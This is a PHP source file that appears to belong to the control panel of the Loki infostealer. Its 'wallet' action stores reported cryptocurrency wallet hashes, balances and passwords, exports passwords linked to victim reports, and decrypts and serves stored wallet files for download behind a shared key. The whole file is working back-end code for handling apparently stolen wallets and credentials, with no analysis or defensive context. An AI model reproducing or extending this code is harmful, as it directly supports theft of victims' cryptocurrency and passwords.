<?php
	if(!defined('IN_LOKI')) die("File not found.");
	
	if($Action == 'wallet')
	{
		$LokiDBCon = new LokiDB($DBData['hostname'], $DBData['username'], $DBData['password'], $DBData['database'], $DBData['port'],  $DBData['prefix'], FALSE, TRUE, 3);
		if(strlen($Option_) && isset($_REQUEST['ak']) && trim($_REQUEST['ak']) == WALLET_)
		{
			if($Option_ == "put" || $Option_ == "both")
			{
				$WalletHash = NULL;
				if(isset($_REQUEST['wh']) && strlen(trim($_REQUEST['wh'])))
					$WalletHash = trim($_REQUEST['wh']);
				
				$Balance = NULL;
				if(isset($_REQUEST['b']) && strlen(trim($_REQUEST['b'])))
					$Balance = trim($_REQUEST['b']);
				
				$Locked = NULL;
				if(isset($_REQUEST['l']) && strlen(trim($_REQUEST['l'])))
					$Locked = trim($_REQUEST['l']);
				
				$Transaction = NULL;
				if(isset($_REQUEST['t']) && strlen(trim($_REQUEST['t'])))
					$Transaction = trim($_REQUEST['t']);
				
				$Password = NULL;
				if(isset($_REQUEST['p']) && strlen(trim($_REQUEST['p'])))
					$Password = trim($_REQUEST['p']);
				
				if($WalletHash != NULL)
				{
					if($Password != NULL)
						$LokiDBCon->UpdateWallet(NULL, NULL, NULL, $Password, NULL, $WalletHash);
					if($Balance != NULL)
						$LokiDBCon->UpdateWallet($Balance, $Locked, $Transaction, NULL, NULL, $WalletHash);
				}
				
				die();
			}
			
			if($Option_ == "get" || $Option_ == "both")
			{
				
				if(isset($_REQUEST['wh']) && isset($_REQUEST['tp'])  && isset($_REQUEST['tp']) == "pw")
				{
					$WalletID = $LokiDBCon->GetWallet(0, 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, trim($_REQUEST['wh']));
					if(isset($WalletID[0]['report_id']))
						$LokiDBCon->ExportPW_($WalletID[0]['report_id']);
					die();
				}

				$Priority = NULL;
				if(isset($_REQUEST['pr']) && strlen(trim($_REQUEST['pr'])))
					$Priority = explode(",", str_replace(" ", "", trim($_REQUEST['pr'])));
				
				if($Priority != NULL && count($Priority) > 0)
				{
					$Cnt = 0;
					while(count($Priority) > $Cnt)
					{
						$Wallet = $LokiDBCon->GetWallet(0, 1, NULL, array($Priority[$Cnt++]), NULL, NULL, NULL, NULL, 0, TRUE);
						if(isset($Wallet['NumOfTotal']) && $Wallet['NumOfTotal'] > 0)
							break;
					}
				}
				
				if(!isset($Wallet['NumOfTotal']) || $Wallet['NumOfTotal'] == 0)
					$Wallet = $LokiDBCon->GetWallet(0, 1, NULL, NULL, NULL, NULL, NULL, NULL, 0, TRUE);
					
				die($ScriptURL . "?".ACTVALUE_."=wallet&opti=dl&n=" . $Wallet[0]["wallet_name"] . "&k=" . substr(sha1($Wallet[0]["wallet_name"] . TEMP_ . WALLET_), 0, 12) . "&ak=" .WALLET_. "|" . $Wallet[0]["wallet_client"] . "|" . $Wallet[0]["wallet_hash"]);
			}
			
			if($Option_ == "dl")
			{
				if(!isset($_REQUEST['n']) || !isset($_REQUEST['k']))
					die();
				
				$WalletName = trim($_REQUEST['n']);
				
				if(substr(sha1($WalletName . TEMP_ . WALLET_), 0, 12) != $_REQUEST['k'] )
					die();
				
				$Data = TEMP_ . '/' . $WalletName;
				if(file_exists($Data))
				{
					$Buffer = DecryptWallet(file_get_contents($Data), ENCKEY_);
					SetDownloadHeader(NowDate("Ymd_His") . "_" . $WalletName . '.wallet');
					echo $Buffer;
				}

				die();
			}
		}
	}
	
